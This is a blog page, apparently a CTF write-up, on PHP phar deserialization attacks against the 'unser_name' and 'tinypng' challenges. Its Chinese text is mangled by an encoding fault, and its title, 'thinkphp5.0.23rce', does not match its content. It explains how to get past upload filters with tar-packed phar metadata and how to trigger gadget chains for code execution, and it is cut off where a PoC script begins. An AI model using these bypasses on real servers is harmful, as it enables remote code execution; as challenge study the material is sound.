<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#B9897F"><meta name="author" content="th0me"><meta name="copyright" content="th0me"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>thinkphp5.0.23rce | th0meÁöÑÂçöÂÆ¢</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#B9897F"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"example.com","root":"/","title":"th0me","version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="‰ªéunser_nameÊ∑±ÂÖ•ÁêÜËß£pharÂèçÂ∫èÂàóÂåñunser_name writeupÊ†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÂíåÁïåÈù¢ÂäüËÉΩÊèêÁ§∫ÔºåÊúâ‰∏ä‰º†ÂäüËÉΩ‰∏îÂèçÂ∫èÂàóÂåñÔºåÂàùÊ≠•ËÄÉËôëphar  ‰∏ÄËà¨ÂèçÂ∫èÂàóÂåñÈÉΩÈúÄË¶ÅÁôΩÁõí‰ª£Á†ÅÊù•ÊûÑÈÄ†popÈìæÔºåÊâÄ‰ª•ÂÖàÁúãÊ≥®ÈáäÊúâÊ≤°ÊúâÊ∫ê‰ª£Á†ÅÔºåÂèëÁé∞ÊèêÁ§∫www.zipÔºå‰∏ãËΩΩ‰∏ãÊù•„ÄÇ ÔºàÊú¨Âú∞ÊµãËØïÊó∂‰ª£Á†ÅÁªèËøá‰øÆÊîπÔºâ  ÁåúÊµãÂèçÂ∫èÂàóÂåñÈìæÂ≠êÂá∫Âè£ÊòØ$find_thisÊåáÂêëÁöÑÂáΩÊï∞Ôºå$name1-&gt;var&#x3D;$name2ÔºåÂÜçÁî®POST‰º†ÂØπ">
<meta property="og:type" content="article">
<meta property="og:title" content="thinkphp5.0.23rce">
<meta property="og:url" content="http://example.com/2021/11/28/unser_name/index.html">
<meta property="og:site_name" content="th0meÁöÑÂçöÂÆ¢">
<meta property="og:description" content="‰ªéunser_nameÊ∑±ÂÖ•ÁêÜËß£pharÂèçÂ∫èÂàóÂåñunser_name writeupÊ†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÂíåÁïåÈù¢ÂäüËÉΩÊèêÁ§∫ÔºåÊúâ‰∏ä‰º†ÂäüËÉΩ‰∏îÂèçÂ∫èÂàóÂåñÔºåÂàùÊ≠•ËÄÉËôëphar  ‰∏ÄËà¨ÂèçÂ∫èÂàóÂåñÈÉΩÈúÄË¶ÅÁôΩÁõí‰ª£Á†ÅÊù•ÊûÑÈÄ†popÈìæÔºåÊâÄ‰ª•ÂÖàÁúãÊ≥®ÈáäÊúâÊ≤°ÊúâÊ∫ê‰ª£Á†ÅÔºåÂèëÁé∞ÊèêÁ§∫www.zipÔºå‰∏ãËΩΩ‰∏ãÊù•„ÄÇ ÔºàÊú¨Âú∞ÊµãËØïÊó∂‰ª£Á†ÅÁªèËøá‰øÆÊîπÔºâ  ÁåúÊµãÂèçÂ∫èÂàóÂåñÈìæÂ≠êÂá∫Âè£ÊòØ$find_thisÊåáÂêëÁöÑÂáΩÊï∞Ôºå$name1-&gt;var&#x3D;$name2ÔºåÂÜçÁî®POST‰º†ÂØπ">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127161920227.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162137224.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162402757.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162855942.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163314452.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163417690.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163700501.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163849116.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128133948839.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134126804.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134812365.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134936802.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134952445.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128135240061.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128135318338.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128150722137.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128150952069.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151614038.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151728252.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151045404.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151131963.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128152813712.png">
<meta property="article:published_time" content="2021-11-28T08:32:52.295Z">
<meta property="article:modified_time" content="2021-11-28T08:34:03.428Z">
<meta property="article:author" content="th0me">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="ÂèçÂ∫èÂàóÂåñ">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127161920227.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="th0me"><img width="96" loading="lazy" src="/images/1.jpg" alt="th0me"><span class="site-author-status" title="ÁûéÂ≠êÊë∏Ë±°">üò≠</span></a><div class="site-author-name"><a href="/about/">th0me</a></div><span class="site-name">th0meÁöÑÂçöÂÆ¢</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">5</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">8</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ÁïôË®ÄÊùø"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://th0me.github.io/images/4.png" title="QQ 821361403" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="ÊàëÁöÑÂ∞è‰ºô‰º¥‰ª¨" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8Eunser-name%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">‰ªéunser_nameÊ∑±ÂÖ•ÁêÜËß£pharÂèçÂ∫èÂàóÂåñ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unser-name-writeup"><span class="toc-number">2.</span> <span class="toc-text">unser_name writeup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%99%8E%E7%AC%A6%E6%9D%AF%E7%BA%BF%E4%B8%8Btinypng-writeup"><span class="toc-number">3.</span> <span class="toc-text">ËôéÁ¨¶ÊùØÁ∫ø‰∏ãtinypng writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">Ê∫êÁ†ÅÂàÜÊûê</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E5%92%8Cpoc"><span class="toc-number">3.2.</span> <span class="toc-text">payloadÂíåpoc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%9F%E8%BF%9B%E4%B8%80%E4%B8%8Bphpggc-laravel-rce5%E7%9A%84%E9%93%BE%E5%AD%90"><span class="toc-number">4.</span> <span class="toc-text">Ë∑üËøõ‰∏Ä‰∏ãphpggc laravel rce5ÁöÑÈìæÂ≠ê</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpggc-laravel-rce5-exp"><span class="toc-number">4.1.</span> <span class="toc-text">phpggc laravel rce5 exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B1unser-name%E5%92%8Ctinypng%E6%94%B6%E8%8E%B7%E7%9A%84%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">Áî±unser_nameÂíåtinypngÊî∂Ëé∑ÁöÑÊÄªÁªì</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E6%BA%90%E7%A0%81%E8%A7%92%E5%BA%A6%E7%9C%8Bphar%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E8%A7%A3%E6%9E%90%E8%BF%99%E5%87%A0%E7%B1%BB%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">6.</span> <span class="toc-text">‰ªéÊ∫êÁ†ÅËßíÂ∫¶Áúãphar‰∏∫‰ªÄ‰πàËÉΩËß£ÊûêËøôÂá†Á±ªÂéãÁº©ÂåÖ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#end"><span class="toc-number">7.</span> <span class="toc-text">end</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://example.com/2021/11/28/unser_name/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="th0me"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="th0meÁöÑÂçöÂÆ¢"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">thinkphp5.0.23rce<a class="post-edit-link" href="https://github.com/YunYouJun/yunyoujun.github.io/tree/hexo/source/_posts/unser_name.md" target="_blank" title="Edit this post" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2021-11-28 16:32:52" itemprop="dateCreated datePublished" datetime="2021-11-28T16:32:52+08:00">2021-11-28</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="Word count in article">2.4k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="Reading time">10m</span></span></span><div class="post-classify"><span class="post-tag"><a class="tag-item" href="/tags/ctf/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">ctf</span></a><a class="tag-item" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">ÂèçÂ∫èÂàóÂåñ</span></a><a class="tag-item" href="/tags/wp/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">wp</span></a></span></div><div class="post-author"><span class="author-name">th0me</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#B9897F;"><h2 id="‰ªéunser-nameÊ∑±ÂÖ•ÁêÜËß£pharÂèçÂ∫èÂàóÂåñ"><a href="#‰ªéunser-nameÊ∑±ÂÖ•ÁêÜËß£pharÂèçÂ∫èÂàóÂåñ" class="headerlink" title="‰ªéunser_nameÊ∑±ÂÖ•ÁêÜËß£pharÂèçÂ∫èÂàóÂåñ"></a>‰ªéunser_nameÊ∑±ÂÖ•ÁêÜËß£pharÂèçÂ∫èÂàóÂåñ</h2><h2 id="unser-name-writeup"><a href="#unser-name-writeup" class="headerlink" title="unser_name writeup"></a>unser_name writeup</h2><p>Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÂíåÁïåÈù¢ÂäüËÉΩÊèêÁ§∫ÔºåÊúâ‰∏ä‰º†ÂäüËÉΩ‰∏îÂèçÂ∫èÂàóÂåñÔºåÂàùÊ≠•ËÄÉËôëphar</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127161920227.png" alt="image-20211127161920227" loading="lazy"></p>
<p>‰∏ÄËà¨ÂèçÂ∫èÂàóÂåñÈÉΩÈúÄË¶ÅÁôΩÁõí‰ª£Á†ÅÊù•ÊûÑÈÄ†popÈìæÔºåÊâÄ‰ª•ÂÖàÁúãÊ≥®ÈáäÊúâÊ≤°ÊúâÊ∫ê‰ª£Á†ÅÔºåÂèëÁé∞ÊèêÁ§∫<a target="_blank" rel="noopener" href="http://www.zip,‰∏ãËΩΩ‰∏ãÊù•./">www.zipÔºå‰∏ãËΩΩ‰∏ãÊù•„ÄÇ</a></p>
<p>ÔºàÊú¨Âú∞ÊµãËØïÊó∂‰ª£Á†ÅÁªèËøá‰øÆÊîπÔºâ</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162137224.png" alt="image-20211127162137224" loading="lazy"></p>
<p>ÁåúÊµãÂèçÂ∫èÂàóÂåñÈìæÂ≠êÂá∫Âè£ÊòØ$find_thisÊåáÂêëÁöÑÂáΩÊï∞Ôºå$name1-&gt;var=$name2ÔºåÂÜçÁî®POST‰º†ÂØπÂ∫îÁöÑÂáΩÊï∞„ÄÇ</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162402757.png" alt="image-20211127162402757" loading="lazy"></p>
<p>Áî±‰∫éÂêéÁºÄÊ£ÄÊü•ÊòØÁôΩÂêçÂçïÔºå‰∏çÁü•ÈÅìÂ∑≤Áü•ÁöÑËß£ÊûêÊºèÊ¥ûÊÉÖÂÜµ‰∏ãÂ∞±‰∏çËÄÉËôëÁªïÂêéÁºÄ‰∫ÜÔºå‰∏çËøáÊÄùË∑Ø‰∏ä‰πüÊõ¥Âä†Á°ÆÂÆöÊòØpharÔºåÊØïÁ´üpharÂèØ‰ª•ÊîπÂêéÁºÄÔºåÂπ∂‰∏îÊúâÂèØÊéßÂèÇÊï∞ÁöÑÊìçÊéßÊñá‰ª∂ÂáΩÊï∞file_existËß¶Âèë</p>
<p>ËÄÉËôëÁªïËøáÈªëÂêçÂçïÔºåÁúãÂà∞ËøôÂá†‰∏™Êñá‰ª∂Â§¥Á¨¨‰∏ÄÊó∂Èó¥Â∞±ÊÉ≥Âà∞ËôéÁ¨¶ÊùØÁ∫ø‰∏ãÁöÑtinypngÔºåÂØπpharÂÜçgzip‰∏ÄÊ¨°Â∞±ÂèØ‰ª•ÁªïËøá__HALT_COMPILERÔºå‰ΩÜÊòØban‰∫Ügzip bzip2 zip ÊâÄ‰ª•Âè™Ââ©‰∏ãtar‰∫Ü„ÄÇ</p>
<p>Âú®phpÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÁöÑÊúâÂÖ≥Ê∫êÁ†Å‰∏≠<img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162855942.png" alt="image-20211127162855942" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcmp(entry.filename, &quot;.phar/.metadata&quot;, sizeof(&quot;.phar/.metadata&quot;)-1</span><br></pre></td></tr></table></figure>

<p>Ëøô‰∏ÄË°åÂåπÈÖçÊñá‰ª∂ÂêçÊòØÂê¶‰ª•.phar/.metadataÂºÄÂ§¥Ôºå‰∏îÂè™ÂåπÈÖçÂºÄÂ§¥ÔºåÊâÄ‰ª•ÁªïËøá‰∏ãÈù¢ÁöÑIn_arrayÁõ¥Êé•Âú®ÂêéÈù¢Âä†‰∏äÊó†ÊÑè‰πâÂ≠óÁ¨¶Â∞±ÂèØ‰ª•‰∫Ü„ÄÇÊé•‰∏ãÊù•phpÂ∞±‰ºö‰ΩøÁî®phar_tar_process_metadataÂíåphar_parse_metadata(&amp;metadata)ÂºÄÂßãÂèçÂ∫èÂàóÂåñ‰∫Ü„ÄÇ</p>
<p>ÊúÄÂêépayload:</p>
<p>Âà∂‰Ωú.phar/.metadata123</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163314452.png" alt="image-20211127163314452" loading="lazy"></p>
<p>ÁîüÊàêtest.tar</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163417690.png" alt="image-20211127163417690" loading="lazy"></p>
<p>ÊîπÂêç‰∏∫test.png‰∏ä‰º†</p>
<p>ÈÄöËøáÁªôÂá∫ÁöÑÂèÇÊï∞ÁÆóÂá∫Êñá‰ª∂Âêçcddc9385153d0b6c5c80a6a94dc9219c.gif</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163700501.png" alt="image-20211127163700501" loading="lazy"></p>
<p>‰ΩøÁî®pharÂçèËÆÆÔºåfunc‰º†phpinfoÂ∞ùËØïÂèëÁé∞ÊàêÂäü</p>
<p>Êé•‰∏ãÊù•ÁàÜÁ†¥create_functionÁîüÊàêÁöÑÂáΩÊï∞ÁöÑÂáΩÊï∞ÂêçÁß∞</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163849116.png" alt="image-20211127163849116" loading="lazy"></p>
<p>ÊãøÂà∞ÁªìÊûú</p>
<h2 id="ËôéÁ¨¶ÊùØÁ∫ø‰∏ãtinypng-writeup"><a href="#ËôéÁ¨¶ÊùØÁ∫ø‰∏ãtinypng-writeup" class="headerlink" title="ËôéÁ¨¶ÊùØÁ∫ø‰∏ãtinypng writeup"></a>ËôéÁ¨¶ÊùØÁ∫ø‰∏ãtinypng writeup</h2><h3 id="Ê∫êÁ†ÅÂàÜÊûê"><a href="#Ê∫êÁ†ÅÂàÜÊûê" class="headerlink" title="Ê∫êÁ†ÅÂàÜÊûê"></a>Ê∫êÁ†ÅÂàÜÊûê</h3><p>buuojÂ§çÁé∞</p>
<p>ÊãøÂà∞Ê∫êÁ†Å laravelÊ°ÜÊû∂ÂÖàÂÖ≥Ê≥®Ë∑ØÁî±ÂíåÁõ∏ÂØπÂ∫îÁöÑÊéßÂà∂Âô®„ÄÇ</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128133948839.png" alt="image-20211128133948839" loading="lazy"></p>
<p>‚Äò/‚ÄòË∑ØÁî±‰∏ãÂ≠òÂú®ÁùÄIndexControllerÔºåË∑üËøõfileUploadÊñπÊ≥ï</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134126804.png" alt="image-20211128134126804" loading="lazy"></p>
<p>Âú®laravelÊ°ÜÊû∂‰∏≠Â∞ÅË£Ö‰∫Ü‰∏Ä‰∏™RequestÁ±ªÊù•Â≠òÊîæÊúâÂÖ≥ËØ∑Ê±ÇÂÜÖÂÆπÔºåËøôÈáå‰ªé$req‰∏≠ÊãøÂá∫‰∏ä‰º†ÁöÑfileÂπ∂ËøõË°åÊúâÂÖ≥ËøáÊª§ÔºåÂÖ∂‰∏≠ËøáÊª§Êéâ‰∫ÜHALT_COMPILERËøô‰∏ÄpharÁöÑÊ†áÂøóÂ§¥ÔºåÊé•‰∏ãÊù•ÊîπÂêçÂ≠óÂ≠òÊîæÂà∞uploads‰∏≠„ÄÇ</p>
<p>Áî±‰∫éËøáÊª§ÂÜÖÂÆπÂæà‰∏•Ê†º‰∏îÂêéÁºÄËøáÊª§ÊòØÁôΩÂêçÂçïÔºåÂèà‰∏çÂ≠òÂú®Â∑≤Áü•ÁöÑËß£ÊûêÊºèÊ¥ûÔºåÊâÄ‰ª•‰∏çËÄÉËôëÂçïÁ∫ØÁöÑÊñá‰ª∂‰∏ä‰º†„ÄÇ</p>
<p>Êç¢‚Äô/image‚ÄôË∑ØÁî±‰∏ãÁöÑImageControllerÂÆ°ËÆ°</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134812365.png" alt="image-20211128134812365" loading="lazy"></p>
<p>handleÊñπÊ≥ïÊé•Âèó‰∏Ä‰∏™imageÂèÇÊï∞ËæìÂÖ•ÔºåÂêéÁºÄÂøÖÈ°ª‰∏∫pngÔºåÂèëÁé∞imgcompressÁ±ªÂíåcompressimgÊñπÊ≥ïÔºåË∑üËøõ‰∏Ä‰∏ãcompressimg</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134936802.png" alt="image-20211128134936802" loading="lazy"></p>
<p>Ë∑üËøõopenImage()</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134952445.png" alt="image-20211128134952445" loading="lazy"></p>
<p>ÂèëÁé∞getimagesize()ÔºåËØ•ÊñπÊ≥ïÂèØ‰ª•Ëß¶ÂèëpharÂèçÂ∫èÂàóÂåñ„ÄÇ</p>
<p>Âà∞Ëøô‰∏™Âú∞ÊñπÊÄùË∑ØÂ∞±ÈùûÂ∏∏ÊòéÁ°ÆÔºåÂè™Ë¶Å$this-&gt;srcÂèØÊéßÔºåÂ∞±ÂèØ‰ª•ÈÄöËøá‰∏ä‰º†ÁöÑpharÊñá‰ª∂Êù•ËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰Ωú„ÄÇ</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128135240061.png" alt="image-20211128135240061" loading="lazy"></p>
<p>ÂèëÁé∞$this-&gt;srcÊòØÂú®ÊûÑÈÄ†Á±ªÁöÑÊó∂ÂÄôËøõË°åÁöÑËµãÂÄº„ÄÇ</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128135318338.png" alt="image-20211128135318338" loading="lazy"></p>
<p>ËÄåÁ±ªÁöÑÂÆû‰æãÂåñÊó∂‰ΩøÁî®ÁöÑÂØπÂ∫îÂèÇÊï∞‰∏∫$source $sourceÂèàÁ≠â‰∫éinput(‚Äòimage‚Äô)ÔºåÊïÖÂèØÊéß„ÄÇ</p>
<p>Êé•‰∏ãÊù•Â∞±ÊòØÈÄöËøáÊâægadget chainÈÄöËøáÂèçÂ∫èÂàóÂåñÊù•ËøõË°åÊºèÊ¥ûÂà©Áî®‰∫ÜÔºå‰∏äphpggc‰∏ÄÊääÊ¢≠„ÄÇ</p>
<h3 id="payloadÂíåpoc"><a href="#payloadÂíåpoc" class="headerlink" title="payloadÂíåpoc"></a>payloadÂíåpoc</h3><p>Âú®buuoj‰∏äÂ§çÁé∞ËøúÁ®ãÊ≠ªÊ¥ªÊâì‰∏çÈÄöÔºåÊü•ËØ¢Áõ∏ÂÖ≥È¢òËß£ÂèëÁé∞‰πüÊúâ‰∫∫Êâì‰∏çÈÄöÔºåÂ∞±‰∏çÊ≠ªÁ£ï‰∫ÜÔºåËÆ∞ÂΩï‰∏™ËÑöÊú¨Êó•ÂêéÊù•Êµã„ÄÇ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># -*- 